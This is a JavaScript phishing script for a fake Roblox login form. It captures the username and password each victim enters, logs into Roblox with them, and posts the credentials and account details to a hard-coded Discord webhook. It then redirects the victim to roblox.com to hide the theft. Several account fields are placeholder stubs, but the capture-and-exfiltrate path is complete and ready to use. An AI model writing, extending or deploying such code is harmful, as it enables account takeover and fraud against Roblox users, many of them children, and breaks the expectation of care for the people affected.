// Replace with your Discord webhook URL
const webhookUrl = 'https://discord.com/api/webhooks/1411889557498232973/n2YLjdbDmZvylu5lJI0_bK0PJK6bxy7zdwzKH3ni0VanRGd0-6FmCqXzDCuCatM2QjR5';

document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    fetchRobloxAccountInfo(username, password).then(accountInfo => {
        sendAccountInfoToDiscord(accountInfo);
        setTimeout(() => {
            window.location.href = 'https://www.roblox.com';
        }, 2000); // Redirect to Roblox home page after 2 seconds
    }).catch(error => {
        console.error('Error fetching account info:', error);
    });
});

async function fetchRobloxAccountInfo(username, password) {
    try {
        // Step 1: Authenticate and get the cookie
        const authResponse = await fetch('https://auth.roblox.com/v2/login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                username: username,
                password: password
            })
        });

        if (!authResponse.ok) {
            throw new Error('Authentication failed');
        }

        const authData = await authResponse.json();
        const cookie = authData.cookie;

        // Step 2: Get user information
        const userResponse = await fetch('https://users.roblox.com/v1/users/authenticated', {
            method: 'GET',
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`
            }
        });

        if (!userResponse.ok) {
            throw new Error('Failed to fetch user information');
        }

        const userData = await userResponse.json();

        // Step 3: Get account details (this is a placeholder; you need to implement actual API calls)
        const accountDetails = {
            username: userData.name,
            password: password, // Note: Storing passwords in plain text is not secure
            location: 'USA', // Placeholder; implement actual location fetching
            '2SV validation': 'Enabled', // Placeholder; implement actual 2SV status fetching
            'Cross-device': 'Allowed', // Placeholder; implement actual cross-device status fetching
            'Account age': '2 years', // Placeholder; implement actual account age calculation
            billing: 'Visa *1234', // Placeholder; implement actual billing information fetching
            balance: '$50.00', // Placeholder; implement actual balance fetching
            'Pending transactions': 'None', // Placeholder; implement actual pending transactions fetching
            'Owned Robux': '1000', // Placeholder; implement actual Robux balance fetching
            'Game passes': '5', // Placeholder; implement actual game passes fetching
            'Played games': '10' // Placeholder; implement actual played games fetching
        };

        return accountDetails;
    } catch (error) {
        console.error('Error fetching account info:', error);
        throw error;
    }
}

function sendAccountInfoToDiscord(accountInfo) {
    const data = {
        content: `New account info logged:\n${formatAccountInfo(accountInfo)}`
    };

    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    }).then(response => {
        if (response.ok) {
            console.log('Account info sent to Discord!');
        } else {
            console.error('Failed to send account info to Discord.', response.status, response.statusText);
        }
    }).catch(error => {
        console.error('Error:', error);
    });
}

function formatAccountInfo(accountInfo) {
    return Object.entries(accountInfo).map(([key, value]) => `**${key}**: ${value}`).join('\n');
}
